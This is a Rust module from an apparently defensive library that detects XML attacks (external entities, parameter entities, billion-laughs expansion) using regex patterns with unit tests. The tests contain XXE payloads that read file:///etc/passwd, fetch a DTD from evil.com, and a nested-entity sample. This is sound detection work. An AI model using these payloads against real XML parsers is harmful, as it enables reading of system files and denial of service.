//! XML threat detection
//!
//! Pattern-based detection for XXE and entity expansion attacks.
//! These are heuristic checks - they may have false positives but
//! prioritize security over convenience.

// Allow expect in lazy_static regex patterns - these are compile-time patterns that will not fail
#![allow(clippy::expect_used)]

use lazy_static::lazy_static;
use regex::Regex;

use super::super::types::FormatThreat;

lazy_static! {
    /// Pattern for DOCTYPE declarations
    static ref DOCTYPE_PATTERN: Regex = Regex::new(
        r"(?i)<!DOCTYPE\s"
    ).expect("valid regex");

    /// Pattern for external entity declarations (SYSTEM or PUBLIC)
    static ref EXTERNAL_ENTITY_PATTERN: Regex = Regex::new(
        r#"(?i)<!ENTITY\s+\w+\s+(SYSTEM|PUBLIC)\s+"#
    ).expect("valid regex");

    /// Pattern for parameter entity declarations (%)
    static ref PARAMETER_ENTITY_PATTERN: Regex = Regex::new(
        r"(?i)<!ENTITY\s+%\s*\w+"
    ).expect("valid regex");

    /// Pattern for entity references that might be external
    static ref ENTITY_REFERENCE_PATTERN: Regex = Regex::new(
        r"&[a-zA-Z_][a-zA-Z0-9_]*;"
    ).expect("valid regex");

    /// Pattern for protocol handlers in entity values
    static ref PROTOCOL_PATTERN: Regex = Regex::new(
        r#"(?i)(file|http|https|ftp|data|php|expect|jar)://"#
    ).expect("valid regex");

    /// Pattern for potential billion laughs (nested entity references)
    static ref ENTITY_EXPANSION_PATTERN: Regex = Regex::new(
        r#"<!ENTITY\s+\w+\s+["'][^"']*&\w+;[^"']*["']>"#
    ).expect("valid regex");
}

/// Check if input contains any XXE patterns
///
/// Returns true if any XXE-related patterns are detected.
/// This is a conservative check that may produce false positives.
#[must_use]
pub(crate) fn is_xxe_present(input: &str) -> bool {
    is_external_entity_present(input)
        || is_parameter_entity_present(input)
        || is_protocol_in_entity_present(input)
}

/// Check if input contains a DOCTYPE declaration
#[must_use]
pub(crate) fn is_dtd_declaration_present(input: &str) -> bool {
    DOCTYPE_PATTERN.is_match(input)
}

/// Check if input contains external entity declarations
#[must_use]
pub(crate) fn is_external_entity_present(input: &str) -> bool {
    EXTERNAL_ENTITY_PATTERN.is_match(input)
}

/// Check if input contains parameter entity declarations
#[must_use]
pub(crate) fn is_parameter_entity_present(input: &str) -> bool {
    PARAMETER_ENTITY_PATTERN.is_match(input)
}

/// Check if input contains protocol handlers in potential entity values
fn is_protocol_in_entity_present(input: &str) -> bool {
    // Only flag protocols if they appear near ENTITY or DOCTYPE
    if is_dtd_declaration_present(input) && PROTOCOL_PATTERN.is_match(input) {
        return true;
    }
    false
}

/// Check if input shows signs of entity expansion attack
fn is_entity_expansion_present(input: &str) -> bool {
    // Look for entities that reference other entities
    ENTITY_EXPANSION_PATTERN.is_match(input)
}

/// Detect all XML threats in input
#[must_use]
pub(crate) fn detect_xml_threats(input: &str) -> Vec<FormatThreat> {
    let mut threats = Vec::new();

    if is_external_entity_present(input) {
        threats.push(FormatThreat::XxeExternalEntity);
    }

    if is_parameter_entity_present(input) {
        threats.push(FormatThreat::XxeParameterEntity);
    }

    if is_entity_expansion_present(input) {
        threats.push(FormatThreat::XxeBillionLaughs);
    }

    if is_dtd_declaration_present(input) && threats.is_empty() {
        // Only flag DTD if no other threats detected
        // (DTD alone is lower severity)
        threats.push(FormatThreat::DtdPresent);
    }

    threats
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    #![allow(clippy::panic, clippy::expect_used)]
    use super::*;

    #[test]
    fn test_is_dtd_declaration_present() {
        assert!(is_dtd_declaration_present("<!DOCTYPE foo>"));
        assert!(is_dtd_declaration_present("<!DOCTYPE html PUBLIC"));
        assert!(is_dtd_declaration_present("<!doctype html>"));
        assert!(!is_dtd_declaration_present("<root/>"));
    }

    #[test]
    fn test_is_external_entity_present() {
        // SYSTEM entity
        let xxe_system = r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#;
        assert!(is_external_entity_present(xxe_system));

        // PUBLIC entity
        let xxe_public = r#"<!ENTITY xxe PUBLIC "foo" "http://evil.com/xxe">"#;
        assert!(is_external_entity_present(xxe_public));

        // Internal entity (not external)
        let internal = r#"<!ENTITY internal "some value">"#;
        assert!(!is_external_entity_present(internal));

        // No entity
        assert!(!is_external_entity_present("<root/>"));
    }

    #[test]
    fn test_is_parameter_entity_present() {
        let param_entity = r#"<!ENTITY % param "value">"#;
        assert!(is_parameter_entity_present(param_entity));

        let normal_entity = r#"<!ENTITY normal "value">"#;
        assert!(!is_parameter_entity_present(normal_entity));
    }

    #[test]
    fn test_is_xxe_present() {
        // External entity
        let xxe = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(is_xxe_present(xxe));

        // Parameter entity
        let param = r#"<!DOCTYPE foo [<!ENTITY % xxe "value">]>"#;
        assert!(is_xxe_present(param));

        // Clean XML
        assert!(!is_xxe_present("<root><child/></root>"));
    }

    #[test]
    fn test_detect_xml_threats_xxe() {
        let xxe = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        let threats = detect_xml_threats(xxe);

        assert!(!threats.is_empty());
        assert!(threats.contains(&FormatThreat::XxeExternalEntity));
    }

    #[test]
    fn test_detect_xml_threats_billion_laughs() {
        let billion_laughs = r#"
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
]>
"#;
        let threats = detect_xml_threats(billion_laughs);
        assert!(threats.contains(&FormatThreat::XxeBillionLaughs));
    }

    #[test]
    fn test_detect_xml_threats_dtd_only() {
        let dtd_only = "<!DOCTYPE html>";
        let threats = detect_xml_threats(dtd_only);

        assert_eq!(threats.len(), 1);
        assert!(threats.contains(&FormatThreat::DtdPresent));
    }

    #[test]
    fn test_detect_xml_threats_clean() {
        let clean = "<root><child>text</child></root>";
        let threats = detect_xml_threats(clean);

        assert!(threats.is_empty());
    }

    #[test]
    fn test_xxe_with_file_protocol() {
        let xxe = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(is_xxe_present(xxe));
    }

    #[test]
    fn test_xxe_with_http_protocol() {
        let xxe = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">]>"#;
        assert!(is_xxe_present(xxe));
    }
}
